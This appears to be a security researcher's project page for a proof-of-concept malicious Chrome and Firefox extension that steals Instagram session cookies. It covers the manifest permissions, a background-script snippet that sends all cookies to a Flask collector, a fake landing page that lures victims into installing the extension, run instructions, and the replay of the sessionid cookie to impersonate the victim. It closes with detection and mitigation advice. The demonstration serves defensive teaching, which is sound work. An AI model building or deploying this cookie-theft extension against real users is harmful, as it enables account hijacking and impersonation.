---
title: "Instagram Session Hijacking — Malicious Extension PoC"
description: "A browser extension that steals session cookies from Instagram, exfiltrates them to a Flask collector server, and demonstrates why unverified extensions are a first-class threat."
date: 2025-12-19
status: "research"
stack: [Python, Flask, JavaScript, Chrome MV3, Firefox MV2, HTML/CSS]
repo: "https://github.com/jonas-fernandez-as/malicious-extension-poc"
video: "https://youtu.be/LyeTdyoM4MQ"
---

## The premise

Browser extensions have permissions that most users never read. A single extension with `cookies` and `host_permissions` for `*.instagram.com` can read every session cookie the site has set. If those cookies are `HttpOnly` but the extension calls `chrome.cookies.getAll`, the flag is irrelevant — the API bypasses it entirely.

This PoC demonstrates that flow end to end: extension steals cookies, sends them to a collector server, and the operator replays them to impersonate the victim.

## Components

1. **Malicious extensions** (`malicious_v2/`, `malicious_v3/`) — two versions because Manifest V2 (Firefox) and V3 (Chrome) have different permission models. Both do the same thing: on page load, read cookies for the target domain and POST them to the C2.
2. **Collector server** (`server/server.py`) — Flask app that receives the POST and appends the payload to a local log file. No database, no auth — this is a demo.
3. **Fake landing page** (`web_page/`) — a plausible-looking site that instructs the victim to install the "helper" extension. Social engineering is the delivery vector.

## How the extension works

The critical permission is declared in `manifest.json`:

```json
{
  "permissions": ["cookies"],
  "host_permissions": ["*://*.instagram.com/*"]
}
```

With that, the background script does:

```js
chrome.cookies.getAll({ domain: ".instagram.com" }, (cookies) => {
  fetch("http://localhost:5000/collect", {
    method: "POST",
    body: JSON.stringify(cookies)
  });
});
```

Two lines. That is the entire attack. The cookie named `sessionid` is what the server actually uses for authentication — everything else is noise.

## Why `HttpOnly` does not save you

`HttpOnly` prevents `document.cookie` from reading the value. It does **not** prevent `chrome.cookies` from reading it. Extensions operate at a different privilege layer than page JavaScript.

This is the single most important takeaway: if a user installs an extension with cookie permissions, `HttpOnly` is not a defense.

## Running it locally

```bash
cd server
python3 -m venv venv
source venv/bin/activate
pip install flask
python3 server.py
```

Load `malicious_v3/` as an unpacked extension in Chrome (`chrome://extensions` → Developer mode → Load unpacked). Navigate to `instagram.com`. The collector logs the cookies.

## Detection and mitigation

From an operator's perspective:

- **Extension auditing.** Enterprise Chrome and Firefox both support allowlisting extensions. Anything not on the list should not install.
- **Network egress.** The extension beacons to a fixed host. A DNS or HTTP inspection layer that flags outbound requests to non-corporate domains catches it.
- **Cookie binding.** Tying session cookies to a device fingerprint (User-Agent, TLS fingerprint, IP range) makes stolen cookies useless from a different host.

From a user's perspective: **read the permissions**. An extension that claims to be a theme but requests cookie access is not a theme.

## Guardrails

The collector binds to `localhost`. The fake page is served locally. Nothing in this repository is deployed, and the extension is not published to any store. Every step is reproducible in an isolated lab.
